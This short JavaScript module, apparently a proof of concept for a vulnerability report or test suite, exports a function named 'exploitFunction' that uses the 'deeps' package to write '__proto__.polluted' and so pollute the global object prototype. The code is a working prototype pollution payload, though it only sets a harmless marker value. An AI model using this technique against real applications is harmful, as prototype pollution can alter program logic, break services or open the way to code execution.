function exploitFunction(obj) {
    const deeps = require("deeps");
    deeps.set(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };